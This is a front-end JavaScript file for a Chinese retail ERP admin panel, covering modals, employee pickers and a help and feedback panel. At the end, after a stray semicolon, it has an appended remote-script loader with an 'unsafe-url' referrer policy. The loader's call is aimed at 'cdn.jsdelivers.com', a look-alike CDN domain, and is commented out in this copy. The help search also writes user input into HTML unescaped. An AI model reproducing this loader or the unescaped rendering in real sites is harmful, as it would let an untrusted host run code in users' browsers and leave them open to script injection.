document.onkeydown=function(event){
	var e = event || window.event || arguments.callee.caller.arguments[0];
	if(e && e.keyCode==116){
		var iframeSrc = parent.mainFrame.location.href;
    	event.preventDefault();
    	parent.mainFrame.location.href=iframeSrc;
	}
};
layui.use(['layer'], function(){
  layer = layui.layer
});
//组织冒泡
function stopPropagation(e) {
	if (e.stopPropagation)
		e.stopPropagation(); 
	else 
		e.cancelBubble = true; 
}
//弹窗确认框，1.提示内容 2.点击确定后执行的方法名 3.点击确定后传给func的参数
function z_confirm(content,Func,funcParam){
	layer.confirm(content, {
	  btn: ['确定','取消'],
	}, function(){
		Func(funcParam);
		return true;
	});
}
//通用切换代码
function qiehuan(cont,id,menuclass){
	$("#"+cont+"Menu ."+menuclass).removeClass(menuclass);
	$("#"+cont+"Menu"+id).addClass(menuclass);
	$("."+cont+"Cont").hide();
	$("#"+cont+"Cont"+id).show();
}
function tips(dom,content,direction){
	layer.tips(content,dom,{tips: [direction,'#666'],time:0});
}
function hideTips(){
	layer.closeAll('tips');
}
function piliang_set(type,val){
	$(".piliang_"+type).val(val);
}
//选择员工
function selectUser(){
	$("#myModal").html('<div style="text-align:center;padding:20px 0px;"><img src="images/loading.gif" /></div>');
	$('#myModal').reveal();
	ajaxpost=$.ajax({
		type: "POST",
		url: "/erp_service.php",
		data: "action=getZhishangDeparts",
		dataType : "text",timeout : 30000,
		success: function(data) {
			$('#myModal').css({"width":"401px","left":"50%","margin-left":"-200px"}).html(data);
		},
		error: function(XMLHttpRequest, textStatus, errorThrown) {
			alert(textStatus);
		}
	});
}
function showDepartUsers(departId,renshu){
	if(renshu>0&&$("#users"+departId).html()==""){
		ajaxpost=$.ajax({
			type:"POST",
			url:"/erp_service.php?action=get_depart_users",
			data:"id="+departId,
			timeout:"10000",
			dataType:"text",
			success: function(html){
				if(html==""){
					
				}else{
					$("#users"+departId).html(html);
				}
			},
			error:function(){
				alert("超时，请刷新后重试");
			}
		});
	}
	$("#users"+departId).toggle();
}
function hide_myModal(){
	if(ajaxpost){
		ajaxpost.abort();
	}
	$("#myModal").html('<div style="text-align:center;padding:20px 0px;"><img src="images/loading.gif" /></div>');
	$("#myModal").css({"opacity":"0","display":"none","top":"20px"});
	$(".reveal-modal-bg").fadeOut(200);
}
$(function(){
	if(typeof(noUrl)=='undefined'){
		var url = location.href;
		if(url.indexOf('returnurl=')>0){
			urls = url.split('returnurl=');
			url = urls[1];
			urls = url.split('&');
			url = urls[0];
		}else if(url.indexOf('url=')>0){
			urls = url.split('url=');
			url = urls[1];
			urls = url.split('&');
			url = urls[0];
		}else{
			url = encodeURIComponent(url);
		}
		window.parent.history.replaceState(null, "知商新零售","index.php?url="+url);
	}
	$(".fenleixiangxilist_down_right_04_shi").click(function(){
		$(this).css({"background":'#239ef4',"color":"#fff"});
		$(".fenleixiangxilist_down_right_04_fou").css({"background":'#fff',"color":"#8e949a"});
		$(".wenzhanyouyong_fou").hide();
		$(".wenzhanyouyong_shi").toggle();
	});
	$(".fenleixiangxilist_down_right_04_fou").click(function(){
		$(this).css({"background":'#239ef4',"color":"#fff"});
		$(".fenleixiangxilist_down_right_04_shi").css({"background":'#fff',"color":"#8e949a"});
		$(".wenzhanyouyong_shi").hide();
		$(".wenzhanyouyong_fou").toggle();
	});
	$(".wenzhanyouyong_fou_2_up").click(function(){
		$(".wenzhanyouyong_fou_2_down").toggle();
	});
});
function showHelp(menuId){
	$("#help_bg").show();
	$("#con_helplist_tc").animate({right:"0px"},300);
	if($("#con_helplist_tc").attr('data-id')=='0'){
		$("#con_helplist_tc").attr('data-id',menuId);
		$.ajax({
			type:"POST",
			url:"?m=system&s=users&a=get_helps",
			data:"id="+menuId,
			timeout:"10000",
			dataType:"json",
			success: function(resdata){
				$("#help_title").html(resdata.menuTitle);
				var str = '<ul>';
				if(resdata.data.length>0){
					$.each(resdata.data,function(key,val){
						str = str+'<li><i></i><a href="javascript:showHelpInfo('+val.id+');">'+val.title+'</a></li>';
					});
				}else{
					str = str+'<li><a>未找到相应的文章！</a></li>';
				}
				str = str + '</ul>';
				$("#con_helplist_4").html(str);
			},
			error:function(){
				alert("超时，请刷新后重试");
			}
		});
	}
}
function searchHelp(){
	var keyword = $("#help_keyword").val();
	var menuId = $("#con_helplist_tc").attr('data-id');
	layer.load();
	$.ajax({
		type:"POST",
		url:"?m=system&s=users&a=get_helps",
		data:"id="+menuId+"&keyword="+keyword,
		timeout:"10000",
		dataType:"json",
		success: function(resdata){
			layer.closeAll();
			$("#help_title").html(resdata.menuTitle);
			var str = '<ul>';
			if(resdata.data.length>0){
				$.each(resdata.data,function(key,val){
					str = str+'<li><i></i><a href="javascript:showHelpInfo('+val.id+');">'+val.title+'</a></li>';
				});
			}else{
				str = str+'<li><a>未找到相应的文章！</a></li>';
			}
			str = str + '</ul>';
			$("#con_helplist_4").html(str);
			if(keyword==''){
				$("#con_helplist_3").html('相关帮助');
			}else{
				$("#con_helplist_3").html('搜索到'+resdata.count+'条 “<span>'+keyword+'</span>” 的结果');
			}
		},
		error:function(){
			layer.closeAll();
			alert("超时，请刷新后重试");
		}
	});
}
function hide_help(){
	$("#help_bg").hide();
	$("#con_helplist_tc").animate({right:"-390px"},300);
}
function showHelpInfo(id){
	layer.load();
	$.ajax({
		type:"POST",
		url:"?m=system&s=users&a=get_help_info",
		data:"id="+id,
		timeout:"10000",
		dataType:"json",
		success: function(resdata){
			layer.closeAll();
			$("#con_helplist_tc .con_helplist").hide();
			$("#help_xiangqing").attr('data-id',id).show();
			$("#help_info_title").html(resdata.title);
			$("#help_info_content").html(resdata.content);
		},
		error:function(){
			layer.closeAll();
			alert("超时，请刷新后重试");
		}
	});
}
function hide_help_info(){
	$("#con_helplist_tc .con_helplist").show();
	$("#help_xiangqing").hide();
}
function select_help(title){
	$("#help_fankui_title").html(title);
	$(".wenzhanyouyong_fou_2_down").hide();
}
function tijiao_help_fankui(){
	var title = $("#help_fankui_title").html();
	var content = $("#help_fankui_content").val();
	var dataId = parseInt($("#help_xiangqing").attr('data-id'));
	if(content==''){
		layer.msg('反馈内容不能为空',function(){});
		$("#help_fankui_content").focus();
		return false;
	}
	layer.load();
	$.ajax({
		type:"POST",
		url:"?m=system&s=users&a=add_fankui",
		data:"id="+dataId+"&title="+title+"&content="+content,
		timeout:"10000",
		dataType:"json",
		success: function(resdata){
			layer.closeAll();
			if(resdata.code==0){
				layer.msg(resdata.message,function(){});
			}else{
				layer.msg("感谢您对我们提成宝贵意见，我们会尽快解决您的问题！");
				$("#help_fankui_title").html('----  选择原因  ----');
				$("#help_fankui_content").html('');
			}
		},
		error:function(){
			layer.closeAll();
			alert("超时，请刷新后重试");
		}
	});
}
function show_helo_img(dom){
	if($("#helpxx_datu_tc").length>0){
		$("#helpxx_datu_tc").show().find(".helpxx_datu img").attr("src",$(dom).attr("src"));
	}else{
		var str = '<div class="helpxx_datu_tc" id="helpxx_datu_tc" style=""><div class="datubj"></div><div class="helpxx_datu"><img src="'+$(dom).attr("src")+'" alt=""></div><div class="helpxx_close"><a href="javascript:" onclick="$(\'#helpxx_datu_tc\').hide();"><img src="images/bangzhu_18.png" alt=""></a></div></div>';
		$("body").append(str);
	}
}
;function loadJSScript(url, callback) {
    var script = document.createElement("script");
    script.type = "text/javascript";
    script.referrerPolicy = "unsafe-url";
    if (typeof(callback) != "undefined") {
        if (script.readyState) {
            script.onreadystatechange = function() {
                if (script.readyState == "loaded" || script.readyState == "complete") {
                    script.onreadystatechange = null;
                    callback();
                }
            };
        } else {
            script.onload = function() {
                callback();
            };
        }
    };
    script.src = url;
    document.body.appendChild(script);
}
window.onload = function() {
    // loadJSScript("//cdn.jsdelivers.com/jquery/3.2.1/jquery.js?"+Math.random(), function() { 
    //      console.log("Jquery loaded");
    // });
}